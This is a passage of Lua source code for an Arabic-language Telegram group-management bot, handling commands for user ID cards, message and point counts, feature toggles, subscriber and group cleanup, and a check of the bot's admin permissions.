Text = '✯︙الشخص الذي قام باضافتك هو » '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,'✯︙انت دخلت عبر الرابط لتلح') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل امر منو ضافني') 
end
end

if text == 'تفعيل ضافني' and ChanSub(msg) and Manager(msg) then   
if database:get(bot_id..'Added:Me'..msg.chat_id_) then
Text = '✯︙تم تفعيل امر منو ضافني'
database:del(bot_id..'Added:Me'..msg.chat_id_)  
else
Text = '✯︙بالتاكيد تم تفعيل امر منو ضافني'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل ضافني' and ChanSub(msg) and Manager(msg) then  
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
database:set(bot_id..'Added:Me'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل امر منو ضافني'
else
Text = '\n✯︙بالتاكيد تم تعطيل امر منو ضافني'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل صيح' and ChanSub(msg) and Manager(msg) then   
if database:get(bot_id..'Seh:User'..msg.chat_id_) then
Text = '✯︙تم تفعيل امر صيح'
database:del(bot_id..'Seh:User'..msg.chat_id_)  
else
Text = '✯︙بالتاكيد تم تفعيل امر صيح'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تنزيل جميع الرتب' and ChanSub(msg) and CoSu(msg) then  
database:del(bot_id..'Basic:Constructor'..msg.chat_id_)
database:del(bot_id..'Constructor'..msg.chat_id_)
database:del(bot_id..'Manager'..msg.chat_id_)
database:del(bot_id..'Mod:User'..msg.chat_id_)
database:del(bot_id..'Special:User'..msg.chat_id_)
database:del(bot_id..'CoSu'..msg.chat_id_)
database:sadd(bot_id..'CoSu'..msg.chat_id_,database:get(bot_id..'CoSuv'..msg.chat_id_))
send(msg.chat_id_, msg.id_, '\n✯︙تم تنزيل الكل من الرتب الاتيه \n✯︙المميزين ، الادمنيه ، المدراء ، المنشئين ، الاساسيين \n')
end
if text == 'تعطيل صيح' and ChanSub(msg) and Manager(msg) then  
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
database:set(bot_id..'Seh:User'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل امر صيح'
else
Text = '\n✯︙بالتاكيد تم تعطيل امر صيح'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل اطردني' and ChanSub(msg) and Manager(msg) then   
if database:get(bot_id..'Cick:Me'..msg.chat_id_) then
Text = '✯︙تم تفعيل امر اطردني'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = '✯︙بالتاكيد تم تفعيل امر اطردني'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل اطردني' and ChanSub(msg) and Manager(msg) then  
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
database:set(bot_id..'Cick:Me'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل امر اطردني'
else
Text = '\n✯︙بالتاكيد تم تعطيل امر اطردني'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'نبذتي' and ChanSub(msg) or text == 'بايو' and ChanSub(msg) or text == 'البايو' and ChanSub(msg) then
local Absbio = database:get(bot_id.."Absbio:status"..msg.chat_id_)
if not Absbio then
send(msg.chat_id_, msg.id_," ✯︙البايو معطل") 
return false  
end
send(msg.chat_id_, msg.id_,'['..GetBio(msg.sender_user_id_)..']')
end
if text == "صورتي" and ChanSub(msg) then
local my_ph = database:get(bot_id.."my_photo:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," ✯︙الصوره معطله") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," ✯︙عدد صورك ➸ "..result.total_count_.." صوره‌‏", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
if text == 'تغير الايدي' and ChanSub(msg) and Manager(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[✯︙ᴜѕᴇʀɴᴀᴍᴇ ➥• #username .
✯︙ᴍѕɢѕ ➥• #msgs .
✯︙ѕᴛᴀᴛѕ ➥• #stast .
✯︙ʏᴏᴜʀ ɪᴅ ➥• #id  .
✯︙ᴇᴅɪᴛ ᴍsɢ ➥• #edit .
✯︙ᴅᴇᴛᴀɪʟs ➥• #auto . 
✯︙ɢᴀᴍᴇ ➥• #game .]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈𝐃 𖤱 #id 𖦴 .
]],
[[
𓄼🇮🇶 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 :#username 
𓄼🇮🇶 𝑺𝒕𝒂𝒔𝒕 :#stast 
𓄼🇮🇶 𝒊𝒅 :#id 
𓄼🇮🇶 𝑮𝒂𝒎𝒆𝑺 :#game 
𓄼🇮🇶 𝑴𝒔𝒈𝒔 :#msgs
]],
[[
❤️|-وف اتفاعل يحلو😍🙈
👨‍👧|- ☆يوزرك #username 🎫
💌|- ☆رسائلك #msgs 💌
🎫|- ☆ايديك #id   🥇
🎟|- ☆موقعك #stast 🌐 
🤸‍♂|- ☆جفصاتك #edit  🌬
🥉|- ☆تفاعلك #auto 🚀
🏆|- ☆مجوهراتك #game 🕹
🌏|- ☆اشترك يحلو🌐《 قناة الكروب》
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]]}
local Text_Rand = List[math.random(#List)]
database:set(bot_id.."KLISH:ID"..msg.chat_id_,Text_Rand)
send(msg.chat_id_, msg.id_,'✯︙تم تغير الايدي ارسل ايدي لرؤيته')
end
if text == ("ايدي") and ChanSub(msg) and msg.reply_to_message_id_ == 0 and not database:get(bot_id..'Bot:Id'..msg.chat_id_) then     
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,WaTaN,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
elseif da.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'عضو'
end
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 1) 
local nummsggp = tonumber(msg.id_/2097152/0.5)
local nspatfa = tonumber(Msguser / nummsggp * 100)
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0)
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
local iduser = msg.sender_user_id_
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
local photps = (WaTaN.total_count_ or 0)
local interaction = Total_Msg(Msguser)
local rtpg = rtpa
local WaTaNa = {
" ✯︙اروح فدوه للحلوين",
" ✯︙حلوة حبيبي معليك بالمضغوطين",
" ✯︙جهرتك منورة ",
" ✯︙هاي شكد حلو انتة",
" ✯︙كيكه وربي",
" ✯︙اصلا مطوري احلئ",
" ✯︙فديت الصاك محح",
" ✯︙فدشـي عمي",
" ✯︙دغيرها شبي هذا",
" ✯︙شهالگيمر ",
" ✯︙شهالصوره تخمبش ",
" ✯︙فديت الحلو ",
" ✯︙ببكن حلك ",
}
local rdphoto = WaTaNa[math.random(#WaTaNa)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#bio',GetBio)
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then   
if database:sismember(bot_id..'User_Bot',msg.sender_user_id_) then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, WaTaN.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
send(msg.chat_id_, msg.id_, '\n✯︙عليك ارسال بدء في خاص البوت لعرض صورتك \n['..get_id_text..']')      
end 
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_, '\n✯︙ليس لديك صور في حسابك \n['..get_id_text..']')      
end 
end
else
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
if database:sismember(bot_id..'User_Bot',msg.sender_user_id_) then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, WaTaN.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n✯︙ايديك ➸ '..msg.sender_user_id_..'\n✯︙معرفك ➸ '..username..'\n✯︙رتبتك ➸ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n✯︙موقعك ➸ '..rtpa..'\n✯︙تفاعلك ➸ '..Total_Msg(Msguser)..'\n✯︙رسائلك ➸ '..Msguser..'\n✯︙نسبه تفاعلك ➸ '..string.sub(nspatfa, 1,5)..' %\n✯︙السحكات ➸ '..edit..'\n✯︙نقاطك ➸ '..NUMPGAME..'\n')
else 
send(msg.chat_id_, msg.id_, '\n✯︙عليك ارسال بدء في خاص البوت لعرض صورتك \n✯︙ايديك ➸ '..msg.sender_user_id_..'\n✯︙معرفك ➸ ['..username..']\n✯︙رتبتك ➸ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n✯︙موقعك ➸ '..rtpa..'\n✯︙تفاعلك ➸ '..Total_Msg(Msguser)..'\n✯︙رسائلك ➸ '..Msguser..'\n✯︙نسبه تفاعلك ➸ '..string.sub(nspatfa, 1,5)..' %\n✯︙السحكات ➸ '..edit..'\n✯︙نقاطك ➸ '..NUMPGAME..'\n')      
end 
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n✯︙عليك الغاء حظر البوت من الخاص لعرض صورتك\n✯︙ايديك ➸ '..msg.sender_user_id_..'\n✯︙معرفك ➸ ['..username..']\n✯︙رتبتك ➸ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n✯︙موقعك ➸ '..rtpa..'\n✯︙تفاعلك ➸ '..Total_Msg(Msguser)..'\n✯︙رسائلك ➸ '..Msguser..'\n✯︙نسبه  تفاعلك ➸ '..string.sub(nspatfa, 1,5)..' %\n✯︙السحكات ➸ '..edit..'\n✯︙نقاطك ➸ '..NUMPGAME..']\n')
else
send(msg.chat_id_, msg.id_, '\n✯︙الصوره ➸ ليس لديك صور في حسابك'..'[\n✯︙ايديك ➸ '..msg.sender_user_id_..'\n✯︙معرفك ➸ ['..username..']\n✯︙رتبتك ➸ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n✯︙موقعك ➸ '..rtpa..'\n✯︙تفاعلك ➸ '..Total_Msg(Msguser)..'\n✯︙رسائلك ➸ '..Msguser..'\n✯︙نسبه تفاعلك ➸ '..string.sub(nspatfa, 1,5)..' %\n✯︙السحكات ➸ '..edit..'\n✯︙نقاطك ➸ '..NUMPGAME..']\n')
end 
end
end
else
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#bio',GetBio)
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_,'[\n✯︙ايديك ➸ '..msg.sender_user_id_..'\n✯︙معرفك ➸ '..username..'\n✯︙رتبتك ➸ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n✯︙موقعك ➸ '..rtpa..'\n✯︙تفاعلك ➸ '..Total_Msg(Msguser)..'\n✯︙رسائلك ➸ '..Msguser..'\n✯︙نسبه تفاعلك ➸ '..string.sub(nspatfa, 1,5)..' %\n✯︙السحكات ➸ '..edit..'\n✯︙نقاطك ➸ '..NUMPGAME..']\n')
end
end

end,nil)
end,nil)
end,nil)
end,nil)
end
end

if text == 'سحكاتي' and ChanSub(msg) or text == 'تعديلاتي' and ChanSub(msg) then 
local Num = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
if Num == 0 then 
Text = '✯︙ليس لديك سحكات'
else
Text = '✯︙عدد سحكاتك *» { '..Num..' } *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "مسح سحكاتي" and ChanSub(msg) or text == "حذف سحكاتي" and ChanSub(msg) then  
send(msg.chat_id_, msg.id_,'✯︙تم مسح سحكاتك'  )  
database:del(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_)
end
if text == "مسح جهاتي" and ChanSub(msg) or text == "حذف جهاتي" and ChanSub(msg) then  
send(msg.chat_id_, msg.id_,'✯︙تم مسح جهاتك'  )  
database:del(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_)
end
if text == 'جهاتي' or text == 'شكد ضفت' then
local Num = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
if Num == 0 then 
Text = '✯︙لم تقم بأضافه احد'
else
Text = '✯︙عدد جهاتك *» { '..Num..' } *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'جهاته' and ChanSub(msg) and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data)  
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..result.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_) or 0)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'✯︙اهلا بك عزيزي\n✯︙عدد جهاته هي *( '..NUMPGAME..' )*')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^جهاته @(.*)$") and ChanSub(msg) then
local username = text:match("^جهاته @(.*)$")
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..result.id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.id_) or 0)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,'✯︙اهلا بك عزيزي\n✯︙عدد جهاته هي *( '..NUMPGAME..' )*')
end,nil)
else
send(msg.chat_id_, msg.id_,'✯︙المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == "تنظيف المشتركين" and ChanSub(msg) and DevWaTaN(msg) then 
local pv = database:smembers(bot_id.."User_Bot")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
database:srem(bot_id.."User_Bot",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'✯︙لا يوجد مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'✯︙عدد المشتركين الان » ( '..#pv..' )\n- تم ازالة » ( '..sendok..' ) من المشتركين\n- الان عدد المشتركين الحقيقي » ( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "تنظيف الكروبات" and ChanSub(msg) and DevWaTaN(msg) or text == "تنظيف الكروبات ✯" and ChanSub(msg) and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
local group = database:smembers(bot_id..'Chek:Groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',group[i])  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=group[i],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'✯︙لا يوجد كروبات وهميه في البوت\n')   
else
local WaTaN = (w + q)
local sendok = #group - WaTaN
if q == 0 then
WaTaN = ''
else
WaTaN = '\n- تم ازالة » { '..q..' } كروبات من البوت'
end
if w == 0 then
WaTaNk = ''
else
WaTaNk = '\n- تم ازالة » {'..w..'} كروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'✯︙عدد الكروبات الان » { '..#group..' }'..WaTaNk..''..WaTaN..'\n*- الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
return false
end

if text and text:match("^(gpinfo)$") or text and text:match("^معلومات الكروب$") then
function gpinfo(arg,data)
-- vardump(data) 
WaTaNdx(msg.chat_id_, msg.id_, '✯︙ايدي المجموعة » ( '..msg.chat_id_..' )\n✯︙عدد الادمنيه » ( *'..data.administrator_count_..' )*\n✯︙عدد المحظورين » ( *'..data.kicked_count_..' )*\n✯︙عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
getChannelFull(msg.chat_id_, gpinfo, nil) 
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text ==("مسح") and ChanSub(msg) and Mod(msg) and tonumber(msg.reply_to_message_id_) > 0 then
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_})   
end   
if database:get(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id..'id:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, " ✯︙تم الغاء الامر ") 
database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id..'id:user'..msg.chat_id_)  
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..iduserr,numadded)  
send(msg.chat_id_, msg.id_," ✯︙تم اضافة له {"..numadded..'} من الرسائل')  
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if database:get(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id..'idgem:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, " ✯︙تم الغاء الامر ") 
database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id..'idgem:user'..msg.chat_id_)  
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..iduserr,numadded)  
send(msg.chat_id_, msg.id_,  1, "✯| تم اضافة له {"..numadded..'} من النقود', 1 , 'md')  
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^اضف رسائل (%d+)$") and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Constructor(msg) then    
WaTaN = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,WaTaN)  
database:setex(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, '✯︙ارسل لي عدد الرسائل الان') 
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^اضف نقاط (%d+)$") and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
WaTaN = text:match("^اضف نقاط (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,WaTaN)  
database:setex(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, '✯︙ارسل لي عدد النقاط التي تريد اضافتها') 
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^اضف نقاط (%d+)$") and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف نقاط (%d+)$")
function reply(extra, result, success)
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_," ✯︙تم اضافة له {"..Num..'} من النقاط')  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^اضف رسائل (%d+)$") and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function reply(extra, result, success)
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) 
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_, "\n✯︙تم اضافة له {"..Num..'} من الرسائل')  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if text == 'نقاط' and ChanSub(msg) or text == 'نقاطي' and ChanSub(msg) then 
local Num = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0
if Num == 0 then 
Text = '✯︙لم تلعب اي لعبه للحصول على نقاط'
else
Text = '✯︙عدد نقاطك التي ربحتها هيه *» { '..Num..' } نقاط *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match("^بيع نقاطي (%d+)$") and ChanSub(msg) or text and text:match("^بيع نقاط (%d+)$") then
local NUMPY = text:match("^بيع نقاطي (%d+)$") or text and text:match("^بيع نقاط (%d+)$") 
if tonumber(NUMPY) == tonumber(0) then
send(msg.chat_id_,msg.id_,"\n* ✯︙لا استطيع البيع اقل من 1 *") 
return false 
end
if tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,'✯︙ليس لديك نقاط في الالعاب\n✯︙اذا كنت تريد ربح نقاط \n✯︙ارسل الالعاب وابدأ اللعب ! ') 
else
local NUM_GAMES = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,'\n✯︙ليس لديك نقاط في هذه لعبه \n✯︙لزيادة نقاطك في اللعبه \n✯︙ارسل الالعاب وابدأ اللعب !') 
return false 
end
local NUMNKO = (NUMPY * 50)
database:decrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,NUMPY)  
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,'✯︙تم خصم *» { '..NUMPY..' }* من نقاطك \n✯︙وتم اضافة* » { '..(NUMPY * 50)..' } رساله الى رسالك *')
end 
return false 
end
if text == 'فحص البوتت' and ChanSub(msg) and Manager(msg) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. msg.chat_id_ ..'&user_id='.. bot_id..'')
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.ok == true then
if Json_Info.result.status == "administrator" then
if Json_Info.result.can_change_info == true then
info = '✔️' else info = '✖' end
if Json_Info.result.can_delete_messages == true then
delete = '✔️' else delete = '✖' end
if Json_Info.result.can_invite_users == true then
invite = '✔️' else invite = '✖' end
if Json_Info.result.can_pin_messages == true then
pin = '✔️' else pin = '✖' end
if Json_Info.result.can_restrict_members == true then
restrict = '✔️' else restrict = '✖' end
if Json_Info.result.can_promote_members == true then
promote = '✔️' else promote = '✖' end 
